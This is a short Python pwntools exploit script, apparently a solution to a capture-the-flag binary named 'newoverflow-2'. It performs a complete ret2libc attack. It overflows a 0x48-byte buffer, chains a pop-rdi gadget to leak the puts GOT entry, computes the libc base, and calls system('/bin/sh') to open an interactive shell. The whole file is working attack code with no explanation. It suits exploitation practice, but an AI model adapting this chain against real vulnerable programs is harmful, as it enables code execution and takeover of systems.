#!/usr/bin/env python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

DEBUG = True

if DEBUG:
	bin = ELF('./vuln')
	r = process('./vuln')
else:
	bin = ELF('/problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e/vuln')
	r = process('/problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e/vuln')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

binsh_off = libc.search('/bin/sh').next()
puts_off = libc.sym['puts']
system_off = libc.sym['system']

poprdiret = 0x00000000004009a3
ret = 0x000000000040028d
main = 0x004008ce
puts_plt = 0x4005f0
puts_got = 0x601018

p = 'A'* 0x48
p += p64(poprdiret)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(main)

r.recv()
r.sendline(p)
leak = r.recvline(False)[:8]
leak += '\x00' * (8-len(leak))
puts = u64(leak)

libc_base = puts - puts_off
binsh = libc_base + binsh_off
system = libc_base + system_off

p = 'A'*0x48
p += p64(poprdiret)
p += p64(binsh)
p += p64(ret)
p += p64(system)

r.sendline(p)
r.interactive()